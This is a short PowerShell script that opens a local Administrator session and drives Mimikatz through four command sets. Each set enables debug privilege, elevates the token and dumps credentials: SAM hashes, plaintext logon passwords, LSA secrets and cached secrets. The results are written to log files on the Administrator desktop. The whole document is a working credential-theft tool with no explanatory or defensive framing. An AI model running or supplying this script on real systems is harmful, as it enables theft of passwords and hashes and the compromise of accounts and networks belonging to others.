# Step 1: Open a local PowerShell session as Administrator
$adminSession = New-PSSession -ComputerName 127.0.0.1 -Credential (Get-Credential -UserName ".\Administrator" -Message "Enter Administrator Password")

# Step 2: Define the Mimikatz commands
$mimikatzCommandSets = @(
    "log C:\Users\Administrator\Desktop\mimiSAM.txt
    Privilege::debug
    Token::elevate
    lsadump::sam
    exit",

    "log C:\Users\Administrator\Desktop\mimiPW.txt
    Privilege::debug
    Token::elevate
    Sekurlsa::logonpasswords
    exit",

    "log C:\Users\Administrator\Desktop\mimiHASH.txt
    Privilege::debug
    Token::elevate
    lsadump::lsa
    exit",

    "log C:\Users\Administrator\Desktop\mimiSecrets.txt
    Privilege::debug
    Token::elevate
    lsadump::secrets
    exit"
)

# Step 3: Execute each command set within the session
foreach ($commands in $mimikatzCommandSets) {
    Invoke-Command -Session $adminSession -ScriptBlock {
        param($cmds)
        $tempScript = [System.IO.Path]::GetTempFileName()
        try {
            $cmds | Out-File -FilePath $tempScript -Encoding ASCII
            Start-Process -FilePath "C:\Path\To\Mimikatz.exe" -ArgumentList "/script:$tempScript" -NoNewWindow -Wait
        } finally {
            Remove-Item -Path $tempScript -Force
        }
    } -ArgumentList $commands
}

# Step 4: Close the session
Remove-PSSession -Session $adminSession
